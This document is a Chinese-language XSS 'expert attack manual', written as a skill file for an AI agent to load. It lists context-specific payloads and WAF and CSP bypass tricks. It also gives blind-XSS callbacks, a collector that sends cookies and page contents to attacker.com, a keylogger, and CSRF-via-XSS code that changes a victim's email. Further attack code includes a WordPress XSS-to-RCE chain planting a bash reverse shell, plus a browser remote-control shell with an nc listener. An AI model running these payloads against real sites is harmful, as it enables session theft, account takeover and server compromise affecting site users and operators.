# 技能：跨站脚本攻击（XSS）——专家攻击手册

> **AI 加载指令**：本技能涵盖非显式的 XSS 技术、上下文特定的载荷选择、WAF 绕过、CSP 绕过以及后利用。假设读者已经知道 `<script>alert(1)</script>` — 本文件仅涵盖基础模型通常会遗漏的内容。对于现实世界的 CVE 案例，HttpOnly 绕过策略、XS-Leaks 侧信道和会话固定攻击，请加载配套的 [SCENARIOS.md](./SCENARIOS.md)。

## 0. 相关路由

### 扩展场景

当您需要时，也加载 [SCENARIOS.md](./SCENARIOS.md)：
- Django 调试页面 XSS (CVE-2017-12794) — 重复键错误 → 未转义异常 → XSS
- 针对遗留 IE 环境的 UTF-7 XSS (`+ADw-script+AD4-`)
- HttpOnly 绕过方法 — 代理浏览器、会话搭乘、通过 XSS 的 CSRF
- XS-Leaks 侧信道攻击 — 时间预言机、缓存探测、`performance.now()` 测量
- 通过 XSS 的会话固定 — 在受害者登录前预设会话 ID
- CSP 受限环境下的 DOM 掉包技术

### 高级技巧

当您需要时，也加载 [ADVANCED_XSS_TRICKS.md](./ADVANCED_XSS_TRICKS.md)：
- mXSS / DOMPurify 绕过 — 命名空间混淆、`<noscript>` 解析差异、表单/表格重构
- DOM 掉包 — 通过 `id`/`name` 属性覆盖、HTMLCollection、深层属性链
- 现代框架 XSS — React `dangerouslySetInnerHTML`、Vue `v-html`、Angular `bypassSecurityTrust*`、Next.js SSR
- Trusted Types 绕过 — 默认策略滥用、非 TT 污点、策略透传
- Service Worker XSS 持久化 — 恶意 SW 注册、fetch 拦截、补丁后生存
- PDF/SVG/MathML XSS 向量、多语言载荷、浏览器特定技巧
- XS-Leaks & 侧信道 — 时间预言机、帧计数、缓存探测、错误事件预言机

在广泛喷射载荷之前，您可以首先加载：
- [上传不安全文件](../upload-insecure-files/SKILL.md) 当您需要完整上传路径：验证、存储、预览和共享行为

### 快速上下文选择

| 上下文 | 首选 | 备用 |
|---|---|---|
| HTML 正文 | `<svg onload=alert(1)>` | `<img src=1 onerror=alert(1)>` |
| 引用属性 | `" autofocus onfocus=alert(1)//` | `" onmouseover=alert(1)//` |
| JavaScript 字符串 | `'-alert(1)-'` | `'</script><svg onload=alert(1)>` |
| URL / href 污点 | `javascript:alert(1)` | `data:text/html,<svg onload=alert(1)>` |
| 标签体如 `title` | `</title><svg onload=alert(1)>` | `</textarea><svg onload=alert(1)>` |
| SVG / XML 污点 | `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>` | XHTML 命名空间载荷 |

```html
<svg onload=alert(1)>
<img src=1 onerror=alert(1)>
" autofocus onfocus=alert(1)//
'</script><svg onload=alert(1)>
javascript:alert(1)
data:text/html,<svg onload=alert(1)>
```

---

## 1. 注入上下文矩阵

在挑选载荷之前识别上下文。错误上下文 = 浪费尝试。

| 上下文 | 指示器 | 开启器 | 载荷 |
|---|---|---|---|
| HTML 标签外 | `<b>INPUT</b>` | `<svg onload=` | `<svg onload=alert(1)>` |
| HTML 属性值 | `value="INPUT"` | `"` 关闭属性 | `"onmouseover=alert(1)//` |
| 行内属性，无标签闭合 | 引用，`>` 被剥离 | 事件注入 | `"autofocus onfocus=alert(1)//` |
| 块标签 (title/script/textarea) | `<title>INPUT</title>` | 先闭合标签 | `</title><svg onload=alert(1)>` |
| href / src / data / action | 链接或表单 | 协议 | `javascript:alert(1)` |
| JS 字符串（单引号） | `var x='INPUT'` | 断开字符串 | `'-alert(1)-'` 或 `'-alert(1)//` |
| 带转义的 JS 字符串 | 反斜杠转义 | 双重转义 | `\'-alert(1)//` |
| JS 逻辑块 | 在 if/function 内 | 闭合 + 注入 | `'}alert(1);{'` |
| 页面上的任何 JS | `<script>...INPUT` | 断开脚本 | `</script><svg onload=alert(1)>` |
| XML 页面 (`text/xml`) | XML 内容类型 | XML 命名空间 | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>` |

---

## 2. 多反射攻击

当输入在同一页面的**多个位置**反射时 — 单个载荷从所有点触发：

```html
<!-- 双重反射 -->
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*

<!-- 三重反射 -->
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='

<!-- 两个独立的输入 (p= 和 q=) -->
p=<svg/1='&q='onload=alert(1)>
```

---

## 3. 高级注入向量

### DOM 插入注入（反射在 DOM 而非源码中）
通过 `.innerHTML`、`document.write`、jQuery `.html()` 插入输入：
```html
<img src=1 onerror=alert(1)>
<iframe src=javascript:alert(1)>
```
对于 URL 控制的资源插入：
```html
data:text/html,<img src=1 onerror=alert(1)>
data:text/html,<iframe src=javascript:alert(1)>
```

### PHP_SELF 路径注入
当 URL 本身反射在表单 `action` 中：
```
https://target.com/page.php/"><svg onload=alert(1)>?param=val
```
在 `.php` 和 `?` 之间注入，使用前导 `/`。

### 文件上传 XSS

**文件名注入**（当文件名反射时）：
```
"><svg onload=alert(1)>.gif
```

**SVG 上传**（通过接受 SVG 的存储 XSS）：
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

**元数据注入**（当 EXIF 反射时）：
```bash
exiftool -Artist='"><svg onload=alert(1)>' photo.jpeg
```

### postMessage XSS（无来源检查）
当页面有 `window.addEventListener('message', ...)` 而无来源验证时：
```html
<iframe src="TARGET_URL" onload="frames[0].postMessage('INJECTION','*')">
```

### postMessage 来源绕过
当来源被检查但使用 `.includes()` 或前缀匹配：
```
http://facebook.com.ATTACKER.com/crosspwn.php?target=//victim.com/page&msg=<script>alert(1)</script>
```
攻击者控制 `facebook.com.ATTACKER.com` 子域名。

### 基于 XML 的 XSS
响应有 `text/xml` 或 `application/xml`：
```html
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//attacker.com/1.js"/>
```

### 无闭合标签的脚本注入
当页面上确实有 `</script>` 标签：
```html
<script src=data:,alert(1)>
<script src=//attacker.com/1.js>
```

---

## 4. CSP 绕过技巧

### JSONP 端点绕过（允许列表域有 JSONP）
```html
<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1);">
</script>
```

### AngularJS CDN 绕过（允许列表 `ajax.googleapis.com`）
```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
<x ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</x>
```

### Angular 表达式（服务器编码 HTML 但 AngularJS 评估）
当 `{{1+1}}` 在页面上评估为 `2` — 经典 CSTI 指示器：
```javascript
// Angular 1.x 沙盒逃逸：
{{constructor.constructor('alert(1)')()}}

// Angular 1.5.x:
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

### base-uri 注入（无 base-uri 限制的 CSP）
```html
<base href="https://attacker.com/">
```
相对 `<script src=...>` 从攻击者服务器加载。

### 基于 DOM 的悬空标记
当 CSP 阻止脚本但允许 `img`：
```html
<img src='https://attacker.com/log?
```
将后续页面内容泄露给攻击者。

---

## 5. 过滤器和 WAF 绕过

### 参数名攻击（WAF 检查值而非名）
当参数名反射时（例如，在 JSON 输出中）：
```
?"></script><base%20c%3D=href%3Dhttps:\mysite>
```
载荷是**参数名**，而不是值。

### 编码链
```
%253C  → 双重编码 <
%26lt; → HTML 实体双重编码
<%00h2 → 空字节注入
%0d%0a → 标签内 CRLF
```
测试顺序：反射 → 编码行为 → 识别过滤逻辑 → 变异。

### 标签变异（黑名单绕过）
```html
<ScRipt>  ← 案例变化
</script/x>  ← 尾部垃圾
<script  ← 不完整（依赖于后续 >）
<%00iframe  ← 空字节
<svg/onload=  ← 而非空格的斜杠
```

### 分片注入（strip-tags 绕过）
过滤器剥离 `<x>...</x>`：
```
"o<x>nmouseover=alert<x>(1)//
"autof<x>ocus o<x>nfocus=alert<x>(1)//
```

### 无事件处理器的向量
```html
<form action=javascript:alert(1)><input type=submit>
<form><button formaction=javascript:alert(1)>click
<isindex action=javascript:alert(1) type=submit value=click>
<object data=javascript:alert(1)>
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
<math><brute href=javascript:alert(1)>click
```

---

## 6. 二次序 XSS

**定义**：输入被存储（通常被规范化/HTML 编码），然后**检索**并插入到 DOM 中而无需重新编码。

**经典触发载荷**（绕过立即 HTML 编码）：
```
&lt;svg/onload&equals;alert(1)&gt;
```
检查：个人资料字段、显示名称、论坛帖子 — 任何数据被存储，然后在不同上下文中重新渲染（例如，管理面板与面向用户）。

**存储 → 管理上下文 XSS**：最影响范围 — 使用定制的用户名注册，等待管理员查看用户列表。

---

## 7. 盲 XSS 方法

每个未立即反射的参数都应测试盲 XSS：
- 联系表单、反馈字段
- 用户代理 / Referer  
- 注册字段
- 错误日志注入

**盲 XSS 回调载荷**（远程 JS 文件方法）：
```html
"><script src=//attacker.com/bxss.js></script>
```

**最小收集器**（托管在 `bxss.js`）：
```javascript
var d = document;
var msg = 'URL: '+d.URL+'\nCOOKIE: '+d.cookie+'\nDOM:\n'+d.documentElement.innerHTML;
fetch('https://attacker.com/collect?'+encodeURIComponent(msg));
```

使用 **XSS Hunter** 或类似盲 XSS 平台进行自动收集。

---

## 8. XSS 利用链

### Cookie 盗取
```javascript
fetch('//attacker.com/?c='+document.cookie)
// HttpOnly 受保护的 Cookies → 无法通过 JS 盗取，需要 CSRF 或会话固定
```

### 键盘记录器
```javascript
document.onkeypress = function(e) {
    fetch('//attacker.com/k?k='+encodeURIComponent(e.key));
}
```

### 通过 XSS 的 CSRF（绕过 CSRF 保护，从 DOM 读取 CSRF 令牌）
```javascript
var r = new XMLHttpRequest();
r.open('GET', '/account/settings', false);
r.send();
var token = /csrf_token['":\s]+([^'"<\s]+)/.exec(r.responseText)[1];
var f = new XMLHttpRequest();
f.open('POST', '/account/email/change', true);
f.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
f.send('email=attacker@evil.com&csrf='+token);
```

### WordPress XSS → RCE（管理员会话 + Hello Dolly 插件）：
```javascript
p = '/wp-admin/plugin-editor.php?';
q = 'file=hello.php';
s = '<?=`bash -i >& /dev/tcp/ATTACKER/4444 0>&1`;?>';
a = new XMLHttpRequest();
a.open('GET', p+q, 0); a.send();
$ = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
    '&newcontent=' + encodeURIComponent(s) + '&action=update&' + q;
b = new XMLHttpRequest();
b.open('POST', p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send($);
b.onreadystatechange = function(){ if(this.readyState==4) fetch('/wp-content/plugins/hello.php'); }
```

### 浏览器远程控制（JS 命令 shell）
```javascript
// 注入到受害者：
setInterval(function(){
    with(document)body.appendChild(createElement('script')).src='//ATTACKER:5855'
},100)
```
```bash
# 攻击者监听器：
while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done
```

---

## 9. 决策树

```
测试 XSS 入口点
├── 输入是否反射在响应中？
│   ├── 是 → 识别上下文 (HTML / JS / 属性 / URL)
│   │         → 选择上下文合适的载荷
│   │         → 如果被阻止 → 检查过滤行为
│   │         │   → 尝试编码、案例变异、分片
│   │         │   → 检查参数名是否反射（WAF 间隙）
│   │         └── 成功 → 升级（Cookie 盗取 / CSRF / RCE）
│   └── 否  → 是否存储？ → 注入盲 XSS 载荷
│             是否在 DOM 中？ → 检查 JS 源代码中的不安全污点
│                             (innerHTML, eval, document.write, location.href)
└── CSP 存在？
    ├── 检查允许列表域上的 JSONP 端点
    ├── 检查 CDN 允许列表上的 AngularJS
    ├── 检查缺少 base-uri → <base> 注入
    └── 检查不安全-eval 或 unsafe-inline 异常
```

---

## 10. XSS 测试过程（ZSEANO 方法）

1. **步骤 1** — 测试非恶意标签：`<h2>`，`<img>`，`<table>` — 它们是否原始反射？
2. **步骤 2** — 测试不完整标签：`<iframe src=//attacker.com/c=`（无闭合 `>`) 
3. **步骤 3** — 编码探测：`<%00h2`，`%0d`，`%0a`，`%09`，`%253C`  
4. **步骤 4** — 如果过滤 `<script>` 和 `onerror` 但**不**是 `<script `（无闭合）：`<script src=//attacker.com?c=`
5. **步骤 5** — 黑名单检查：`<svg>` 是否工作？`<ScRiPt>` 是否工作？
6. 注意：**相同的过滤器可能存在于其他地方** — 如果他们在搜索中过滤 `<script>`，他们是否在文件上传文件名中过滤它？在个人简介中？

**关键洞察**：过滤器存在 = 存在漏洞，开发者尝试修补。在整个应用程序中追查这条线索。
